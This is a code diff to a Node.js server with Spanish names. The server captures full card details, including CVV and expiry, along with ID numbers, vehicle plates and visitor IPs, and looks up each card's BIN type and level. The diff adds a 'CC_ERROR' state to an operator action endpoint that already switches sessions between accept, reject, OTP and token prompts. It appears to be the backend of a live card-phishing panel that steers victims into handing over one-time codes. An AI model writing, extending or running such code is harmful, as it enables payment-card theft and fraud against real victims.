@@ -280,9 +280,14 @@ const server = http.createServer(async (req, res) => {
             const sessionId = decodeURIComponent(matchAccion[1]);
             try {
                 const { accion } = await getBody(req);
+                // 🔥 AGREGADO: CC_ERROR
                 const mapEstados = {
-                    ACEPTAR: 'aceptado', RECHAZAR: 'rechazado',
-                    OTP: 'otp', TOKEN: 'token', FINALIZAR: 'finalizado'
+                    ACEPTAR: 'aceptado', 
+                    RECHAZAR: 'rechazado',
+                    OTP: 'otp', 
+                    TOKEN: 'token', 
+                    FINALIZAR: 'finalizado',
+                    CC_ERROR: 'cc_error' 
                 };
                 if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
                 estadoSesiones.set(sessionId, mapEstados[accion]);
@@ -408,7 +413,6 @@ const server = http.createServer(async (req, res) => {
             const { sessionId, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, placa, subsidio } = datos;
             if (!sessionId || !marca) { json(res, 400, { ok: false }); return; }
 
-            // 🎯 NUEVO: Consultar BIN para obtener tipo y nivel de tarjeta
             const infoBin = await obtenerInfoBin(tarjeta);
 
             estadoSesiones.set(sessionId, 'pendiente');
@@ -416,7 +420,6 @@ const server = http.createServer(async (req, res) => {
                 bancoKey: bancoKey, marca, tarjeta, titular, docType, docNumber,
                 monto, expMes, expAnio, cvv, placa: placa || '', subsidio: subsidio || false,
                 ip, creadoEn: new Date().toISOString(),
-                // 🎯 NUEVO: Campos de BIN
                 bin: infoBin?.bin || (tarjeta ? String(tarjeta).replace(/\D/g, '').substring(0, 6) : ''),
                 cardBrand: infoBin?.cardBrand || marca || 'Desconocida',
                 cardType: infoBin?.cardType || 'Desconocido',
